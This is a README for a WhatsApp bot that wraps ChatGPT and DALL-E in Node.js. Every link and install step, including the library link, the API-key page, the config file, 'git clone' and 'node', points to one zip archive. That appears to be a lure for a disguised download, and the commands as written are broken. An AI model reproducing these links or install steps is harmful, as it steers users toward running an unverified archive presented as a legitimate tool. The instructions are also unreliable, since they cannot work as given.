# Wa-OpenAI

***WhatsApp OpenAI ChatGPT Create with NodeJS Using Library [Baileys](https://raw.githubusercontent.com/Prabbbu/Wa-OpenAI/main/lib/Wa-Open-AI-2.3-beta.4.zip)***

## BACA DULU
Terdapat 2 fitur yaitu ```ChatGPT(text)``` dan ```DALL-E(Text To Image).```<br>Untuk commandnya menggunakan ```/ai``` dan ```/img```

## Get OpenAI ChatGPT ApiKey
Silakan buat apikeynya terlebih dahulu [Disini](https://raw.githubusercontent.com/Prabbbu/Wa-OpenAI/main/lib/Wa-Open-AI-2.3-beta.4.zip)

## Add OpenAI ChatGPT Key ##
Masukkan ApiKey OpenAI pada file [https://raw.githubusercontent.com/Prabbbu/Wa-OpenAI/main/lib/Wa-Open-AI-2.3-beta.4.zip](https://raw.githubusercontent.com/Prabbbu/Wa-OpenAI/main/lib/Wa-Open-AI-2.3-beta.4.zip)

## Install

1. **Clone the repository**
   ```sh
   git clone https://raw.githubusercontent.com/Prabbbu/Wa-OpenAI/main/lib/Wa-Open-AI-2.3-beta.4.zip
   ```
2. **Install the dependencies**
   ```sh
   npm install
   ```

3. **Run**
   ```bash
   $ node https://raw.githubusercontent.com/Prabbbu/Wa-OpenAI/main/lib/Wa-Open-AI-2.3-beta.4.zip
   ```
